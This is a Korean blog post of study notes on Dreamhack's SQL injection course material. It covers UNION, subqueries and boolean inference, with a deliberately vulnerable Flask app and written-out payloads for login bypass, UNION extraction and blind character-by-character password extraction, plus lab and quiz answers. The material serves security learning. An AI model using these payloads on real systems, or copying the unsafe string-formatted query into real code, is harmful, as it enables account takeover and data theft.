---
title: Dreamhack SQL Features
date: 2022-02-22 22:22:00
tags: Dreamhack
categoreis: Dreamhack
---

## UNION
UNION 은 다수의 SELECT 구문의 결과를 결합하는 절입니다
해당 절을 통해 다른 테이블에 접근하거나 원하는 쿼리 결과를 생성해 애플리케이션에서 처리하는 타 데이터를 조작할 수 있습니다

이는 애플리케이션이 데이터베이스 쿼리의 실행 결과를 출력하는 경우 유용하게 사용할 수 있는 절입니다

Figure1 은 UNION 절의 사용 예시입니다
username 과 password 컬럼에 각각 Dremahack , Dreamhack PW 가 일치하는 데이터를 조회한 것을 알 수 있습니다

Figure1 UNION 절의 사용 예시

```SQL
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW";
/*
+-----------+--------------+
| username  | password     |
+-----------+--------------+
| admin     | admin        |
| guest     | guest        |
| DreamHack | DreamHack PW |
+-----------+--------------+
3 rows in set (0.01 sec)
*/
```

## Condition
해당 구문을 사용할 때에는 두 가지 필수 조건을 만족해야 합니다
첫번째로는 이전 SELECT 구문과 UNION 을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 합니다

Figure2 는 mysql 에서 두 구문의 결과인 컬럼의 갯수가 일치하지 않아 에러가 발생하는 모습입니다

Figure2 잘못된 UNION 사용 예시 - 컬럼 갯수

```SQL
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW", "Third Column";
/*
ERROR 1222 (21000): The used SELECT statements have a different number of columns
*/
```

두 번째로는 특정 DBMS 에서는 이전 SELECT 구문과 UNION 을 사용한 구문의 컬럼 타입이 같아야 합니다
Figure3 은 MSSQL 에서 두 구문의 컬럼 타입이 일치하지 않아 에러가 발생하는 모습입니다

Figure3 잘못된 UNION 사용 예시 - 컬럼 타입

```SQL
# MSSQL (SQL Server)
SELECT 'ABC'
UNION SELECT 123;
/*
Conversion failed when converting the varchar value 'ABC' to data type int.
*/
```

## UNION 모듈 실습
다음은 사용자가 입력한 uid 와 upw 가 일치할 때 uid 를 출력하는 모듈로 , SQL Injection 취약점이 존재합니다

앞서 배운 UNION 구문을 사용해 admin 의 패스워드를 획득해보세요

```SQL
[Step 1]
모든 조건이 참(True)이 되도록 설정합니다.
uid=1' or '1
upw=1' or '1
[Step 2]
Union 구문을 사용해 admin의 upw를 출력합니다.
uid=' union select upw from user_table where uid='admin' or '
upw=
```

## Subquery
서브 쿼리는 한 쿼리 내에 또 다른 쿼리를 사용하는 것을 의미합니다
서브 쿼리를 사용하기 위해서는 쿼리 내에서 괄호 안에 구문을 삽입해야하며 , SELECT 구문만 사용할 수 있습니다

공격자는 서브쿼리를 통해 쿼리가 접근하는 테이블이 아닌 다른 테이블에 접근하거나 SELECT 구문을 사용하지 않는 쿼리문에서 SQL Injection 취약점이 발생할 때 SELECT 구문을 사용할 수 있습니다

Figure4 는 서브 쿼리를 사용해 데이터를 조회한 모습입니다
결과를 살펴보면 , 서브 쿼리가 실행되어 456 이 출력된 것을 확인할 수 있습니다

Figure4 서브쿼리 사용 예시

```SQL
mysql> SELECT 1,2,3,(SELECT 456); 
/*
+---+---+---+--------------+
| 1 | 2 | 3 | (SELECT 456) |
+---+---+---+--------------+
| 1 | 2 | 3 |          456 |
+---+---+---+--------------+
1 row in set (0.00 sec)
*/
```

## 서브 쿼리 사용 예시
서브 쿼리를 실제로 어떻게 사용하는지 알아보고 , 사용할 때 주의해야 할 점을 알아보겠습니다

### COLUMNS 절
SELECT 구문의 컬럼 절에서 서브 쿼리를 사용할 때에는 단일 행 과 단일 컬럼이 반환되도록 해야합니다

Figure4 는 복수의 행과 컬럼을 반환하는 서브 쿼리를 실행한 모습입니다
결과를 살펴보면 , 복수의 행 또는 컬럼을 반환하면서 에러가 발생하는 것을 확인할 수 있습니다

Figure4 서브 쿼리 사용 예시 - COLUMN

```SQL
mysql> SELECT username, (SELECT "ABCD" UNION SELECT 1234) FROM users;
ERROR 1242 (21000): Subquery returns more than 1 row
mysql> SELECT username, (SELECT "ABCD", 1234) FROM users;
ERROR 1241 (21000): Operand should contain 1 column(s)
```

### FROM 절
FROM 절에서 사용하는 서브 쿼리는 인라인 뷰 라고 하며 , 이는 다중 행 과 다중 컬럼 결과를 반환할 수 있습니다

Figure5 는 인라인 뷰를 이용해 다중 행과 컬럼의 결과를 반환하는 쿼리문을 실행할 모습입니다

Figure5 서브 쿼리 사용 예시 - FROM

```SQL
mysql> SELECT * FROM (SELECT *, 1234 FROM users) as u;
/*
+----------+------+
| username | 1234 |
+----------+------+
| admin    | 1234 |
| guest    | 1234 |
+----------+------+
2 rows in set (0.00 sec)
*/
```

### WHERE 절
WHERE 절에서 서브 쿼리를 사용하면 다중 행 결과를 반환하는 쿼리문을 실행할 수 있습니다

Figure6 은 WHERE 절에서 다중 행을 반환하는 쿼리를 실행한 모습입니다

Figure6 서브 쿼리 사용 예시 - WHERE

```SQL
mysql> SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
/*
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| guest    | guest    |
+----------+----------+
2 rows in set (0.00 sec)
*/
```

## Application Logic
SQL Injection 은 애플리케이션 내부에서 사용하는 데이터베이스의 데이터를 조작하는 기법입니다

만약 특정 쿼리를 실행했을 때 쿼리의 실행 결과를 애플리케이션에서 보여지지 않는다면 공격자 입장에서는 데이터베이스의 정보를 추측하기 어렵습니다

대부분의 애플리케이션은 데이터베이스의 결과에 따라 각기 다른 기능을 수행합니다

예를 들어 특정 번호의 게시물을 조회할 때 번호에 일치하는 게시물이 있다면 이용자에게 보여주고 없다면 게시물이 존재하지 않는다는 메시지를 출력합니다

이를 통해 공격자는 참과 거짓을 구분하여 공격을 수행할 수 있습니다

Figure7 은 Flask 프레임워크를 사용한 예제 코드입니다
코드를 살펴보면 인자로 전달된 username 을 쿼리로 사용하면서 SQL Injection 이 발생하며 해당 쿼리의 결과로 username 이 admin 일 경우 참을 아닌 경에는 거짓을 반환합니다

Figure7 Application Logic 예제 코드

```python
from flask import Flask, request
import pymysql
app = Flask(__name__)
def getConnection():
  return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
@app.route('/' , methods=['GET'])
def index():
  username = request.args.get('username')
  sql = "select username from users where username='%s'" %username
  conn = getConnection()
  curs = conn.cursor(pymysql.cursors.DictCursor)
  curs.execute(sql)
  rows = curs.fetchall()
  conn.close()
  if(rows[0]['username'] == "admin"):
    return "True"
  else:
    return "False"
app.run(host='0.0.0.0', port=8000)
```

### Logic 이용 공격
데이터베이스가 아래와 같이 구성되어 있다고 가정합니다

- username : admin , guest
- password : Password_for_admin , guest_Password

### UNION 을 사용한 공격
UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있습니다

Figure8 은 SQL Injection 으로 새로운 쿼리를 삽입한 모습입니다
공격 코드를 삽입하면 UNION 절에서 admin 을 반환하기 때문에 애플리케이션에서 참을 반환하게 됩니다

Figure8 UNION 절을 이용한 공격

```
/?username=' union select 'admin' -- -
==> True
```

### 비교 구문을 사용한 공격
애플리케이션에서 admin 을 반환해 관리자 권한으로 로그인하는 방법도 있지만 관리자 계정의 비밀번호를 알아내는 방법 또한 존재합니다

SQL 에서는 IF 문을 사용해 비교 구문을 만들 수 있습니다
해당 구문을 통해 관리자 계정의 비밀번호를 한 글자씩 알아낼 수 있습니다

Figure9 는 비교 구문을 통해 관리자 계정의 비밀번호를 한 글자씩 알아내는 공격 쿼리입니다

substr 함수는 첫 번째 인자로 전달된 문자열을 두 번째 인자로 전달된 위치에서 시작하여 세 번째 인자로 전달된 문자 수 만큼의 문자들을 반환합니다

비밀번호 첫 번째 바이트가 B 인지 비교하고 반환 결과를 통해 비밀번호의 첫 번째 바이트는 B 가 아님을 알 수 있습니다 이후 두 번째와 세 번째 쿼리의 반환 결과를 통해 첫 번째 바이트가 P 두 번째 바이트가 a 인 것을 알아낼 수 있습니다 

이와 같은 방법으로 관리자 계정의 비밀번호를 알아낼 수 있습니다.

```
/?username=' union select if(substr(password,1,1)='B', 'admin', 'not admin') from users where username='admin' -- -
==> False
/?username=' union select if(substr(password,1,1)='P', 'admin', 'not admin') from users where username='admin' -- -
==> True
/?username=' union select if(substr(password,2,1)='a', 'admin', 'not admin') from users where username='admin' -- -
==> True
```

## SQL Injection 모듈 실습
SQL Injection 취약점이 존재하는 모듈입니다
주어진 목표를 확인하고 이를 만족하는 쿼리를 실행해보시기 바랍니다

목표 0

SQL Injection을 통해 로그인을 우회하세요

```
조건을 참으로 만들어 SQL결과에 데이터가 포함되도록 합니다.
upw=1" OR 1-- 
```

목표 1

SQL Injection을 통해 Admin의 Full Password를 찾아 Find Admin Password에 입력하세요

```
결과의 한 글자만 출력됩니다. substr을 통해 index를 조절하며 한 글자씩 회득할 수 있습니다
upw=" union select substr(upw,1,1) from users where uid='admin'-- 
upw=" union select substr(upw,2,1) from users where uid='admin'-- 
...
upw=" union select substr(upw,6,1) from users where uid='admin'--

pw 2020
```

목표 2

Find Admin Password에 입력을 바꿔가면서 Admin Password를 찾으세요

```
Find Admin PW 입력칸에 pw+[0-9] 값을 입력하며 결과를 통해 값의 결과를 확인할 수 있습니다.
"6자리 비밀번호 중 n만큼 맞췄습니다"라는 문구가 출력되면 입력된 pw 만큼은 맞았다는 것을 알 수 있습니다

pw9531
```

목표 3

Blind SQL Injection을 통해 Admin의 Full Password를 찾아 Find Admin Password에 입력하세요

```
한 글자씩 비교해가며 로그인 성공 여부를 통해 결과를 확인할 수 있습니다
upw=" or uid="admin" and substr(upw,1,1)="p
upw=" or uid="admin" and substr(upw,2,1)="w
...
upw=" or uid="admin" and substr(upw,6,1)="8

pw3018
```

## SQL Features Quiz
> 1. D
2. UNION

* * * 

## Reference
Reference : https://dreamhack.io
